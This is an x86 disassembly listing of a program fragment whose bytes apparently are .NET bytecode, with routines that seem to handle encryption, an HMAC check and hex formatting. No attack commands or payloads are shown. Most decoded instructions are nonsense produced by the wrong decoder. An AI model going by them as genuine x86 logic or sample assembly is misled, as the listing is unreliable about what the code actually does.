  40419f:	20 00                	and    %al,(%eax)
  4041a1:	01 00                	add    %eax,(%eax)
  4041a3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4041a6:	00 00                	add    %al,(%eax)
  4041a8:	0a 07                	or     (%edi),%al
  4041aa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  4041b0:	d3 00                	roll   %cl,(%eax)
  4041b2:	00 0a                	add    %cl,(%edx)
  4041b4:	07                   	pop    %es
  4041b5:	17                   	pop    %ss
  4041b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041b7:	d4 00                	aam    $0x0
  4041b9:	00 0a                	add    %cl,(%edx)
  4041bb:	07                   	pop    %es
  4041bc:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  4041bf:	00 00                	add    %al,(%eax)
  4041c1:	0a 07                	or     (%edi),%al
  4041c3:	02 7b 2a             	add    0x2a(%ebx),%bh
  4041c6:	00 00                	add    %al,(%eax)
  4041c8:	04 6f                	add    $0x6f,%al
  4041ca:	d6                   	salc
  4041cb:	00 00                	add    %al,(%eax)
  4041cd:	0a 07                	or     (%edi),%al
  4041cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d0:	d7                   	xlat   %ds:(%ebx)
  4041d1:	00 00                	add    %al,(%eax)
  4041d3:	0a 06                	or     (%esi),%al
  4041d5:	07                   	pop    %es
  4041d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d7:	d8 00                	fadds  (%eax)
  4041d9:	00 0a                	add    %cl,(%edx)
  4041db:	17                   	pop    %ss
  4041dc:	73 d9                	jae    0x4041b7
  4041de:	00 00                	add    %al,(%eax)
  4041e0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4041e3:	07                   	pop    %es
  4041e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4041e5:	da 00                	fiaddl (%eax)
  4041e7:	00 0a                	add    %cl,(%edx)
  4041e9:	16                   	push   %ss
  4041ea:	07                   	pop    %es
  4041eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4041ec:	da 00                	fiaddl (%eax)
  4041ee:	00 0a                	add    %cl,(%edx)
  4041f0:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4041f3:	4c                   	dec    %esp
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	0a 08                	or     (%eax),%cl
  4041f8:	03 16                	add    (%esi),%edx
  4041fa:	03 8e 69 6f 4c 00    	add    0x4c6f69(%esi),%ecx
  404200:	00 0a                	add    %cl,(%edx)
  404202:	08 6f db             	or     %ch,-0x25(%edi)
  404205:	00 00                	add    %al,(%eax)
  404207:	0a 02                	or     (%edx),%al
  404209:	7b 2b                	jnp    0x404236
  40420b:	00 00                	add    %al,(%eax)
  40420d:	04 73                	add    $0x73,%al
  40420f:	dc 00                	faddl  (%eax)
  404211:	00 0a                	add    %cl,(%edx)
  404213:	0d 09 06 6f dd       	or     $0xdd6f0609,%eax
  404218:	00 00                	add    %al,(%eax)
  40421a:	0a 1f                	or     (%edi),%bl
  40421c:	20 06                	and    %al,(%esi)
  40421e:	6f                   	outsl  %ds:(%esi),(%dx)
  40421f:	dd 00                	fldl   (%eax)
  404221:	00 0a                	add    %cl,(%edx)
  404223:	8e 69 1f             	mov    0x1f(%ecx),%gs
  404226:	20 59 6f             	and    %bl,0x6f(%ecx)
  404229:	de 00                	fiadds (%eax)
  40422b:	00 0a                	add    %cl,(%edx)
  40422d:	13 04 06             	adc    (%esi,%eax,1),%eax
  404230:	16                   	push   %ss
  404231:	6a 6f                	push   $0x6f
  404233:	4e                   	dec    %esi
  404234:	00 00                	add    %al,(%eax)
  404236:	0a 06                	or     (%esi),%al
  404238:	11 04 16             	adc    %eax,(%esi,%edx,1)
  40423b:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  40423e:	69 6f 4c 00 00 0a dd 	imul   $0xdd0a0000,0x4c(%edi),%ebp
  404245:	27                   	daa
  404246:	00 00                	add    %al,(%eax)
  404248:	00 09                	add    %cl,(%ecx)
  40424a:	39 06                	cmp    %eax,(%esi)
  40424c:	00 00                	add    %al,(%eax)
  40424e:	00 09                	add    %cl,(%ecx)
  404250:	6f                   	outsl  %ds:(%esi),(%dx)
  404251:	33 00                	xor    (%eax),%eax
  404253:	00 0a                	add    %cl,(%edx)
  404255:	dc 08                	fmull  (%eax)
  404257:	39 06                	cmp    %eax,(%esi)
  404259:	00 00                	add    %al,(%eax)
  40425b:	00 08                	add    %cl,(%eax)
  40425d:	6f                   	outsl  %ds:(%esi),(%dx)
  40425e:	33 00                	xor    (%eax),%eax
  404260:	00 0a                	add    %cl,(%edx)
  404262:	dc 07                	faddl  (%edi)
  404264:	39 06                	cmp    %eax,(%esi)
  404266:	00 00                	add    %al,(%eax)
  404268:	00 07                	add    %al,(%edi)
  40426a:	6f                   	outsl  %ds:(%esi),(%dx)
  40426b:	33 00                	xor    (%eax),%eax
  40426d:	00 0a                	add    %cl,(%edx)
  40426f:	dc 06                	faddl  (%esi)
  404271:	6f                   	outsl  %ds:(%esi),(%dx)
  404272:	dd 00                	fldl   (%eax)
  404274:	00 0a                	add    %cl,(%edx)
  404276:	13 05 dd 0d 00 00    	adc    0xddd,%eax
  40427c:	00 06                	add    %al,(%esi)
  40427e:	39 06                	cmp    %eax,(%esi)
  404280:	00 00                	add    %al,(%eax)
  404282:	00 06                	add    %al,(%esi)
  404284:	6f                   	outsl  %ds:(%esi),(%dx)
  404285:	33 00                	xor    (%eax),%eax
  404287:	00 0a                	add    %cl,(%edx)
  404289:	dc 11                	fcoml  (%ecx)
  40428b:	05 2a 00 00 00       	add    $0x2a,%eax
  404290:	01 34 00             	add    %esi,(%eax,%eax,1)
  404293:	00 02                	add    %al,(%edx)
  404295:	00 9c 00 35 d1 00 0d 	add    %bl,0xd00d135(%eax,%eax,1)
  40429c:	00 00                	add    %al,(%eax)
  40429e:	00 00                	add    %al,(%eax)
  4042a0:	02 00                	add    (%eax),%al
  4042a2:	6a 00                	push   $0x0
  4042a4:	74 de                	je     0x404284
  4042a6:	00 0d 00 00 00 00    	add    %cl,0x0
  4042ac:	02 00                	add    (%eax),%al
  4042ae:	26 00 c5             	es add %al,%ch
  4042b1:	eb 00                	jmp    0x4042b3
  4042b3:	0d 00 00 00 00       	or     $0x0,%eax
  4042b8:	02 00                	add    (%eax),%al
  4042ba:	17                   	pop    %ss
  4042bb:	00 ee                	add    %ch,%dh
  4042bd:	05 01 0d 00 00       	add    $0xd01,%eax
  4042c2:	00 00                	add    %al,(%eax)
  4042c4:	1b 30                	sbb    (%eax),%esi
  4042c6:	05 00 50 01 00       	add    $0x15000,%eax
  4042cb:	00 17                	add    %dl,(%edi)
  4042cd:	00 00                	add    %al,(%eax)
  4042cf:	11 03                	adc    %eax,(%ebx)
  4042d1:	3a 0b                	cmp    (%ebx),%cl
  4042d3:	00 00                	add    %al,(%eax)
  4042d5:	00 72 18             	add    %dh,0x18(%edx)
  4042d8:	27                   	daa
  4042d9:	00 70 73             	add    %dh,0x73(%eax)
  4042dc:	cf                   	iret
  4042dd:	00 00                	add    %al,(%eax)
  4042df:	0a 7a 03             	or     0x3(%edx),%bh
  4042e2:	73 4d                	jae    0x404331
  4042e4:	00 00                	add    %al,(%eax)
  4042e6:	0a 0a                	or     (%edx),%cl
  4042e8:	73 d1                	jae    0x4042bb
  4042ea:	00 00                	add    %al,(%eax)
  4042ec:	0a 0b                	or     (%ebx),%cl
  4042ee:	07                   	pop    %es
  4042ef:	20 00                	and    %al,(%eax)
  4042f1:	01 00                	add    %eax,(%eax)
  4042f3:	00 6f d2             	add    %ch,-0x2e(%edi)
  4042f6:	00 00                	add    %al,(%eax)
  4042f8:	0a 07                	or     (%edi),%al
  4042fa:	20 80 00 00 00 6f    	and    %al,0x6f000000(%eax)
  404300:	d3 00                	roll   %cl,(%eax)
  404302:	00 0a                	add    %cl,(%edx)
  404304:	07                   	pop    %es
  404305:	17                   	pop    %ss
  404306:	6f                   	outsl  %ds:(%esi),(%dx)
  404307:	d4 00                	aam    $0x0
  404309:	00 0a                	add    %cl,(%edx)
  40430b:	07                   	pop    %es
  40430c:	18 6f d5             	sbb    %ch,-0x2b(%edi)
  40430f:	00 00                	add    %al,(%eax)
  404311:	0a 07                	or     (%edi),%al
  404313:	02 7b 2a             	add    0x2a(%ebx),%bh
  404316:	00 00                	add    %al,(%eax)
  404318:	04 6f                	add    $0x6f,%al
  40431a:	d6                   	salc
  40431b:	00 00                	add    %al,(%eax)
  40431d:	0a 02                	or     (%edx),%al
  40431f:	7b 2b                	jnp    0x40434c
  404321:	00 00                	add    %al,(%eax)
  404323:	04 73                	add    $0x73,%al
  404325:	dc 00                	faddl  (%eax)
  404327:	00 0a                	add    %cl,(%edx)
  404329:	0c 08                	or     $0x8,%al
  40432b:	06                   	push   %es
  40432c:	6f                   	outsl  %ds:(%esi),(%dx)
  40432d:	dd 00                	fldl   (%eax)
  40432f:	00 0a                	add    %cl,(%edx)
  404331:	1f                   	pop    %ds
  404332:	20 06                	and    %al,(%esi)
  404334:	6f                   	outsl  %ds:(%esi),(%dx)
  404335:	dd 00                	fldl   (%eax)
  404337:	00 0a                	add    %cl,(%edx)
  404339:	8e 69 1f             	mov    0x1f(%ecx),%gs
  40433c:	20 59 6f             	and    %bl,0x6f(%ecx)
  40433f:	de 00                	fiadds (%eax)
  404341:	00 0a                	add    %cl,(%edx)
  404343:	0d 1f 20 8d 44       	or     $0x448d201f,%eax
  404348:	00 00                	add    %al,(%eax)
  40434a:	01 13                	add    %edx,(%ebx)
  40434c:	04 06                	add    $0x6,%al
  40434e:	11 04 16             	adc    %eax,(%esi,%edx,1)
  404351:	11 04 8e             	adc    %eax,(%esi,%ecx,4)
  404354:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40435b:	02 09                	add    (%ecx),%cl
  40435d:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404360:	50                   	push   %eax
  404361:	00 00                	add    %al,(%eax)
  404363:	06                   	push   %es
  404364:	3a 0b                	cmp    (%ebx),%cl
  404366:	00 00                	add    %al,(%eax)
  404368:	00 72 46             	add    %dh,0x46(%edx)
  40436b:	27                   	daa
  40436c:	00 70 73             	add    %dh,0x73(%eax)
  40436f:	df 00                	filds  (%eax)
  404371:	00 0a                	add    %cl,(%edx)
  404373:	7a dd                	jp     0x404352
  404375:	0d 00 00 00 08       	or     $0x8000000,%eax
  40437a:	39 06                	cmp    %eax,(%esi)
  40437c:	00 00                	add    %al,(%eax)
  40437e:	00 08                	add    %cl,(%eax)
  404380:	6f                   	outsl  %ds:(%esi),(%dx)
  404381:	33 00                	xor    (%eax),%eax
  404383:	00 0a                	add    %cl,(%edx)
  404385:	dc 1f                	fcompl (%edi)
  404387:	10 8d 44 00 00 01    	adc    %cl,0x1000044(%ebp)
  40438d:	13 05 06 11 05 16    	adc    0x16051106,%eax
  404393:	1f                   	pop    %ds
  404394:	10 6f 45             	adc    %ch,0x45(%edi)
  404397:	00 00                	add    %al,(%eax)
  404399:	0a 26                	or     (%esi),%ah
  40439b:	07                   	pop    %es
  40439c:	11 05 6f e0 00 00    	adc    %eax,0xe06f
  4043a2:	0a 06                	or     (%esi),%al
  4043a4:	07                   	pop    %es
  4043a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4043a6:	e1 00                	loope  0x4043a8
  4043a8:	00 0a                	add    %cl,(%edx)
  4043aa:	16                   	push   %ss
  4043ab:	73 d9                	jae    0x404386
  4043ad:	00 00                	add    %al,(%eax)
  4043af:	0a 13                	or     (%ebx),%dl
  4043b1:	06                   	push   %es
  4043b2:	06                   	push   %es
  4043b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4043b4:	e2 00                	loop   0x4043b6
  4043b6:	00 0a                	add    %cl,(%edx)
  4043b8:	1f                   	pop    %ds
  4043b9:	10 6a 59             	adc    %ch,0x59(%edx)
  4043bc:	17                   	pop    %ss
  4043bd:	6a 58                	push   $0x58
  4043bf:	d4 8d                	aam    $0x8d
  4043c1:	44                   	inc    %esp
  4043c2:	00 00                	add    %al,(%eax)
  4043c4:	01 13                	add    %edx,(%ebx)
  4043c6:	07                   	pop    %es
  4043c7:	11 06                	adc    %eax,(%esi)
  4043c9:	11 07                	adc    %eax,(%edi)
  4043cb:	16                   	push   %ss
  4043cc:	11 07                	adc    %eax,(%edi)
  4043ce:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4043d1:	45                   	inc    %ebp
  4043d2:	00 00                	add    %al,(%eax)
  4043d4:	0a 8d 44 00 00 01    	or     0x1000044(%ebp),%cl
  4043da:	13 08                	adc    (%eax),%ecx
  4043dc:	11 07                	adc    %eax,(%edi)
  4043de:	16                   	push   %ss
  4043df:	11 08                	adc    %ecx,(%eax)
  4043e1:	16                   	push   %ss
  4043e2:	11 08                	adc    %ecx,(%eax)
  4043e4:	8e 69 28             	mov    0x28(%ecx),%gs
  4043e7:	e3 00                	jecxz  0x4043e9
  4043e9:	00 0a                	add    %cl,(%edx)
  4043eb:	11 08                	adc    %ecx,(%eax)
  4043ed:	13 09                	adc    (%ecx),%ecx
  4043ef:	dd 29                	(bad) (%ecx)
  4043f1:	00 00                	add    %al,(%eax)
  4043f3:	00 11                	add    %dl,(%ecx)
  4043f5:	06                   	push   %es
  4043f6:	39 07                	cmp    %eax,(%edi)
  4043f8:	00 00                	add    %al,(%eax)
  4043fa:	00 11                	add    %dl,(%ecx)
  4043fc:	06                   	push   %es
  4043fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4043fe:	33 00                	xor    (%eax),%eax
  404400:	00 0a                	add    %cl,(%edx)
  404402:	dc 07                	faddl  (%edi)
  404404:	39 06                	cmp    %eax,(%esi)
  404406:	00 00                	add    %al,(%eax)
  404408:	00 07                	add    %al,(%edi)
  40440a:	6f                   	outsl  %ds:(%esi),(%dx)
  40440b:	33 00                	xor    (%eax),%eax
  40440d:	00 0a                	add    %cl,(%edx)
  40440f:	dc 06                	faddl  (%esi)
  404411:	39 06                	cmp    %eax,(%esi)
  404413:	00 00                	add    %al,(%eax)
  404415:	00 06                	add    %al,(%esi)
  404417:	6f                   	outsl  %ds:(%esi),(%dx)
  404418:	33 00                	xor    (%eax),%eax
  40441a:	00 0a                	add    %cl,(%edx)
  40441c:	dc 11                	fcoml  (%ecx)
  40441e:	09 2a                	or     %ebp,(%edx)
  404420:	41                   	inc    %ecx
  404421:	64 00 00             	add    %al,%fs:(%eax)
  404424:	02 00                	add    (%eax),%al
  404426:	00 00                	add    %al,(%eax)
  404428:	5a                   	pop    %edx
  404429:	00 00                	add    %al,(%eax)
  40442b:	00 4f 00             	add    %cl,0x0(%edi)
  40442e:	00 00                	add    %al,(%eax)
  404430:	a9 00 00 00 0d       	test   $0xd000000,%eax
  404435:	00 00                	add    %al,(%eax)
  404437:	00 00                	add    %al,(%eax)
  404439:	00 00                	add    %al,(%eax)
  40443b:	00 02                	add    %al,(%edx)
  40443d:	00 00                	add    %al,(%eax)
  40443f:	00 e2                	add    %ah,%dl
  404441:	00 00                	add    %al,(%eax)
  404443:	00 42 00             	add    %al,0x0(%edx)
  404446:	00 00                	add    %al,(%eax)
  404448:	24 01                	and    $0x1,%al
  40444a:	00 00                	add    %al,(%eax)
  40444c:	0f 00 00             	sldt   (%eax)
  40444f:	00 00                	add    %al,(%eax)
  404451:	00 00                	add    %al,(%eax)
  404453:	00 02                	add    %al,(%edx)
  404455:	00 00                	add    %al,(%eax)
  404457:	00 1e                	add    %bl,(%esi)
  404459:	00 00                	add    %al,(%eax)
  40445b:	00 15 01 00 00 33    	add    %dl,0x33000001
  404461:	01 00                	add    %eax,(%eax)
  404463:	00 0d 00 00 00 00    	add    %cl,0x0
  404469:	00 00                	add    %al,(%eax)
  40446b:	00 02                	add    %al,(%edx)
  40446d:	00 00                	add    %al,(%eax)
  40446f:	00 18                	add    %bl,(%eax)
  404471:	00 00                	add    %al,(%eax)
  404473:	00 28                	add    %ch,(%eax)
  404475:	01 00                	add    %eax,(%eax)
  404477:	00 40 01             	add    %al,0x1(%eax)
  40447a:	00 00                	add    %al,(%eax)
  40447c:	0d 00 00 00 00       	or     $0x0,%eax
  404481:	00 00                	add    %al,(%eax)
  404483:	00 13                	add    %dl,(%ebx)
  404485:	30 03                	xor    %al,(%ebx)
  404487:	00 22                	add    %ah,(%edx)
  404489:	00 00                	add    %al,(%eax)
  40448b:	00 18                	add    %bl,(%eax)
  40448d:	00 00                	add    %al,(%eax)
  40448f:	11 17                	adc    %edx,(%edi)
  404491:	0a 16                	or     (%esi),%dl
  404493:	0b 38                	or     (%eax),%edi
  404495:	11 00                	adc    %eax,(%eax)
  404497:	00 00                	add    %al,(%eax)
  404499:	03 07                	add    (%edi),%eax
  40449b:	91                   	xchg   %eax,%ecx
  40449c:	04 07                	add    $0x7,%al
  40449e:	91                   	xchg   %eax,%ecx
  40449f:	3b 02                	cmp    (%edx),%eax
  4044a1:	00 00                	add    %al,(%eax)
  4044a3:	00 16                	add    %dl,(%esi)
  4044a5:	0a 07                	or     (%edi),%al
  4044a7:	17                   	pop    %ss
  4044a8:	58                   	pop    %eax
  4044a9:	0b 07                	or     (%edi),%eax
  4044ab:	03 8e 69 32 e9 06    	add    0x6e93269(%esi),%ecx
  4044b1:	2a 00                	sub    (%eax),%al
  4044b3:	00 1b                	add    %bl,(%ebx)
  4044b5:	30 03                	xor    %al,(%ebx)
  4044b7:	00 6e 00             	add    %ch,0x0(%esi)
  4044ba:	00 00                	add    %al,(%eax)
  4044bc:	19 00                	sbb    %eax,(%eax)
  4044be:	00 11                	add    %dl,(%ecx)
  4044c0:	28 19                	sub    %bl,(%ecx)
  4044c2:	00 00                	add    %al,(%eax)
  4044c4:	0a 02                	or     (%edx),%al
  4044c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044c7:	1f                   	pop    %ds
  4044c8:	00 00                	add    %al,(%eax)
  4044ca:	0a 0a                	or     (%edx),%cl
  4044cc:	73 e5                	jae    0x4044b3
  4044ce:	00 00                	add    %al,(%eax)
  4044d0:	0a 0b                	or     (%ebx),%cl
  4044d2:	07                   	pop    %es
  4044d3:	06                   	push   %es
  4044d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4044d5:	8f 00                	pop    (%eax)
  4044d7:	00 0a                	add    %cl,(%edx)
  4044d9:	0a dd                	or     %ch,%bl
  4044db:	0d 00 00 00 07       	or     $0x7000000,%eax
  4044e0:	39 06                	cmp    %eax,(%esi)
  4044e2:	00 00                	add    %al,(%eax)
  4044e4:	00 07                	add    %al,(%edi)
  4044e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4044e7:	33 00                	xor    (%eax),%eax
  4044e9:	00 0a                	add    %cl,(%edx)
  4044eb:	dc 73 90             	fdivl  -0x70(%ebx)
  4044ee:	00 00                	add    %al,(%eax)
  4044f0:	0a 0c 06             	or     (%esi,%eax,1),%cl
  4044f3:	0d 16 13 04 38       	or     $0x38041316,%eax
  4044f8:	1f                   	pop    %ds
  4044f9:	00 00                	add    %al,(%eax)
  4044fb:	00 09                	add    %cl,(%ecx)
  4044fd:	11 04 91             	adc    %eax,(%ecx,%edx,4)
  404500:	13 05 08 12 05 72    	adc    0x72051208,%eax
  404506:	9c                   	pushf
  404507:	27                   	daa
  404508:	00 70 28             	add    %dh,0x28(%eax)
  40450b:	91                   	xchg   %eax,%ecx
  40450c:	00 00                	add    %al,(%eax)
  40450e:	0a 6f 92             	or     -0x6e(%edi),%ch
  404511:	00 00                	add    %al,(%eax)
  404513:	0a 26                	or     (%esi),%ah
  404515:	11 04 17             	adc    %eax,(%edi,%edx,1)
  404518:	58                   	pop    %eax
  404519:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40451c:	04 09                	add    $0x9,%al
  40451e:	8e 69 32             	mov    0x32(%ecx),%gs
  404521:	da 08                	fimull (%eax)
  404523:	6f                   	outsl  %ds:(%esi),(%dx)
  404524:	38 00                	cmp    %al,(%eax)
  404526:	00 0a                	add    %cl,(%edx)
  404528:	6f                   	outsl  %ds:(%esi),(%dx)
  404529:	94                   	xchg   %eax,%esp
  40452a:	00 00                	add    %al,(%eax)
  40452c:	0a 2a                	or     (%edx),%ch
  40452e:	00 00                	add    %al,(%eax)
  404530:	01 10                	add    %edx,(%eax)
  404532:	00 00                	add    %al,(%eax)
  404534:	02 00                	add    (%eax),%al
  404536:	12 00                	adc    (%eax),%al
  404538:	0d 1f 00 0d 00       	or     $0xd001f,%eax
  40453d:	00 00                	add    %al,(%eax)
  40453f:	00 1b                	add    %bl,(%ebx)
  404541:	30 02                	xor    %al,(%edx)
  404543:	00 22                	add    %ah,(%edx)
  404545:	00 00                	add    %al,(%eax)
  404547:	00 1a                	add    %bl,(%edx)
  404549:	00 00                	add    %al,(%eax)
  40454b:	11 73 e5             	adc    %esi,-0x1b(%ebx)
  40454e:	00 00                	add    %al,(%eax)
  404550:	0a 0a                	or     (%edx),%cl
  404552:	06                   	push   %es
  404553:	02 6f 8f             	add    -0x71(%edi),%ch
  404556:	00 00                	add    %al,(%eax)
  404558:	0a 0b                	or     (%ebx),%cl
  40455a:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  404560:	39 06                	cmp    %eax,(%esi)
  404562:	00 00                	add    %al,(%eax)
  404564:	00 06                	add    %al,(%esi)
  404566:	6f                   	outsl  %ds:(%esi),(%dx)
  404567:	33 00                	xor    (%eax),%eax
  404569:	00 0a                	add    %cl,(%edx)
  40456b:	dc 07                	faddl  (%edi)
  40456d:	2a 00                	sub    (%eax),%al
  40456f:	00 01                	add    %al,(%ecx)
  404571:	10 00                	adc    %al,(%eax)
  404573:	00 02                	add    %al,(%edx)
  404575:	00 06                	add    %al,(%esi)
  404577:	00 0d 13 00 0d 00    	add    %cl,0xd0013
  40457d:	00 00                	add    %al,(%eax)
  40457f:	00 13                	add    %dl,(%ebx)
  404581:	30 03                	xor    %al,(%ebx)
  404583:	00 3b                	add    %bh,(%ebx)
  404585:	00 00                	add    %al,(%eax)
  404587:	00 1b                	add    %bl,(%ebx)
  404589:	00 00                	add    %al,(%eax)
  40458b:	11 73 90             	adc    %esi,-0x70(%ebx)
  40458e:	00 00                	add    %al,(%eax)
  404590:	0a 0a                	or     (%edx),%cl
  404592:	02 0b                	add    (%ebx),%cl
  404594:	16                   	push   %ss
  404595:	0c 38                	or     $0x38,%al
  404597:	1f                   	pop    %ds
  404598:	00 00                	add    %al,(%eax)
  40459a:	00 07                	add    %al,(%edi)
  40459c:	08 91 0d 06 72 a2    	or     %dl,-0x5d8df9f3(%ecx)
  4045a2:	27                   	daa
  4045a3:	00 70 09             	add    %dh,0x9(%eax)
  4045a6:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045aa:	01 28                	add    %ebp,(%eax)
  4045ac:	e6 00                	out    %al,$0x0
  4045ae:	00 0a                	add    %cl,(%edx)
  4045b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4045b1:	92                   	xchg   %eax,%edx
  4045b2:	00 00                	add    %al,(%eax)
  4045b4:	0a 26                	or     (%esi),%ah
  4045b6:	08 17                	or     %dl,(%edi)
  4045b8:	58                   	pop    %eax
  4045b9:	0c 08                	or     $0x8,%al
  4045bb:	07                   	pop    %es
  4045bc:	8e 69 32             	mov    0x32(%ecx),%gs
  4045bf:	db 06                	fildl  (%esi)
  4045c1:	6f                   	outsl  %ds:(%esi),(%dx)
  4045c2:	38 00                	cmp    %al,(%eax)
  4045c4:	00 0a                	add    %cl,(%edx)
  4045c6:	2a 00                	sub    (%eax),%al
  4045c8:	13 30                	adc    (%eax),%esi
  4045ca:	03 00                	add    (%eax),%eax
  4045cc:	3b 00                	cmp    (%eax),%eax
  4045ce:	00 00                	add    %al,(%eax)
  4045d0:	1b 00                	sbb    (%eax),%eax
  4045d2:	00 11                	add    %dl,(%ecx)
  4045d4:	73 90                	jae    0x404566
  4045d6:	00 00                	add    %al,(%eax)
  4045d8:	0a 0a                	or     (%edx),%cl
  4045da:	02 0b                	add    (%ebx),%cl
  4045dc:	16                   	push   %ss
  4045dd:	0c 38                	or     $0x38,%al
  4045df:	1f                   	pop    %ds
  4045e0:	00 00                	add    %al,(%eax)
  4045e2:	00 07                	add    %al,(%edi)
  4045e4:	08 91 0d 06 72 b2    	or     %dl,-0x4d8df9f3(%ecx)
  4045ea:	27                   	daa
  4045eb:	00 70 09             	add    %dh,0x9(%eax)
  4045ee:	8c 44 00 00          	mov    %es,0x0(%eax,%eax,1)
  4045f2:	01 28                	add    %ebp,(%eax)
  4045f4:	e6 00                	out    %al,$0x0
  4045f6:	00 0a                	add    %cl,(%edx)
  4045f8:	6f                   	outsl  %ds:(%esi),(%dx)
  4045f9:	92                   	xchg   %eax,%edx
  4045fa:	00 00                	add    %al,(%eax)
  4045fc:	0a 26                	or     (%esi),%ah
  4045fe:	08 17                	or     %dl,(%edi)
  404600:	58                   	pop    %eax
  404601:	0c 08                	or     $0x8,%al
  404603:	07                   	pop    %es
  404604:	8e 69 32             	mov    0x32(%ecx),%gs
  404607:	db 06                	fildl  (%esi)
  404609:	6f                   	outsl  %ds:(%esi),(%dx)
  40460a:	38 00                	cmp    %al,(%eax)
  40460c:	00 0a                	add    %cl,(%edx)
  40460e:	2a 00                	sub    (%eax),%al
  404610:	13 30                	adc    (%eax),%esi
  404612:	04 00                	add    $0x0,%al
  404614:	2c 00                	sub    $0x0,%al
  404616:	00 00                	add    %al,(%eax)
  404618:	1c 00                	sbb    $0x0,%al
  40461a:	00 11                	add    %dl,(%ecx)
  40461c:	02 8e 69 8d 44 00    	add    0x448d69(%esi),%cl
  404622:	00 01                	add    %al,(%ecx)
  404624:	0a 02                	or     (%edx),%al
  404626:	8e 69 17             	mov    0x17(%ecx),%gs
  404629:	59                   	pop    %ecx
  40462a:	0b 16                	or     (%esi),%edx
  40462c:	0c 38                	or     $0x38,%al
  40462e:	0e                   	push   %cs
  40462f:	00 00                	add    %al,(%eax)
  404631:	00 06                	add    %al,(%esi)
  404633:	08 02                	or     %al,(%edx)
  404635:	07                   	pop    %es
  404636:	91                   	xchg   %eax,%ecx
  404637:	9c                   	pushf
  404638:	07                   	pop    %es
  404639:	17                   	pop    %ss
  40463a:	59                   	pop    %ecx
  40463b:	0b 08                	or     (%eax),%ecx
  40463d:	17                   	pop    %ss
  40463e:	58                   	pop    %eax
  40463f:	0c 08                	or     $0x8,%al
  404641:	06                   	push   %es
  404642:	8e 69 32             	mov    0x32(%ecx),%gs
  404645:	ec                   	in     (%dx),%al
  404646:	06                   	push   %es
  404647:	2a 13                	sub    (%ebx),%dl
  404649:	30 02                	xor    %al,(%edx)
  40464b:	00 36                	add    %dh,(%esi)
  40464d:	00 00                	add    %al,(%eax)
  40464f:	00 01                	add    %al,(%ecx)
  404651:	00 00                	add    %al,(%eax)
  404653:	11 16                	adc    %edx,(%esi)
  404655:	0a 38                	or     (%eax),%bh
  404657:	15 00 00 00 02       	adc    $0x2000000,%eax
  40465c:	7b 38                	jnp    0x404696
  40465e:	00 00                	add    %al,(%eax)
  404660:	04 06                	add    $0x6,%al
  404662:	6f                   	outsl  %ds:(%esi),(%dx)
  404663:	ea 00 00 0a 6f 6b 00 	ljmp   $0x6b,$0x6f0a0000
  40466a:	00 06                	add    %al,(%esi)
  40466c:	06                   	push   %es
  40466d:	17                   	pop    %ss
  40466e:	58                   	pop    %eax
  40466f:	0a 06                	or     (%esi),%al
  404671:	02 7b 38             	add    0x38(%ebx),%bh
  404674:	00 00                	add    %al,(%eax)
  404676:	04 6f                	add    $0x6f,%al
  404678:	eb 00                	jmp    0x40467a
  40467a:	00 0a                	add    %cl,(%edx)
  40467c:	32 dd                	xor    %ch,%bl
  40467e:	02 7b 38             	add    0x38(%ebx),%bh
  404681:	00 00                	add    %al,(%eax)
  404683:	04 6f                	add    $0x6f,%al
  404685:	ec                   	in     (%dx),%al
  404686:	00 00                	add    %al,(%eax)
  404688:	0a 2a                	or     (%edx),%ch
  40468a:	00 00                	add    %al,(%eax)
  40468c:	13 30                	adc    (%eax),%esi
  40468e:	02 00                	add    (%eax),%al
  404690:	1b 00                	sbb    (%eax),%eax
  404692:	00 00                	add    %al,(%eax)
  404694:	1d 00 00 11 73       	sbb    $0x73110000,%eax
  404699:	94                   	xchg   %eax,%esp
  40469a:	00 00                	add    %al,(%eax)
  40469c:	06                   	push   %es
  40469d:	0a 06                	or     (%esi),%al
  40469f:	02 7d 37             	add    0x37(%ebp),%bh
  4046a2:	00 00                	add    %al,(%eax)
  4046a4:	04 02                	add    $0x2,%al
  4046a6:	7b 38                	jnp    0x4046e0
  4046a8:	00 00                	add    %al,(%eax)
  4046aa:	04 06                	add    $0x6,%al
  4046ac:	6f                   	outsl  %ds:(%esi),(%dx)
  4046ad:	b9 00 00 0a 06       	mov    $0x60a0000,%ecx
  4046b2:	2a 00                	sub    (%eax),%al
  4046b4:	1b 30                	sbb    (%eax),%esi
  4046b6:	02 00                	add    (%eax),%al
  4046b8:	60                   	pusha
  4046b9:	00 00                	add    %al,(%eax)
  4046bb:	00 1e                	add    %bl,(%esi)
  4046bd:	00 00                	add    %al,(%eax)
  4046bf:	11 15 0a 15 0b 03    	adc    %edx,0x30b150a
  4046c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4046c6:	7d 00                	jge    0x4046c8
  4046c8:	00 0a                	add    %cl,(%edx)
  4046ca:	0c 02                	or     $0x2,%al
  4046cc:	7b 38                	jnp    0x404706
  4046ce:	00 00                	add    %al,(%eax)
  4046d0:	04 6f                	add    $0x6f,%al
  4046d2:	bb 00 00 0a 0d       	mov    $0xd0a0000,%ebx
  4046d7:	38 26                	cmp    %ah,(%esi)
  4046d9:	00 00                	add    %al,(%eax)
  4046db:	00 12                	add    %dl,(%edx)
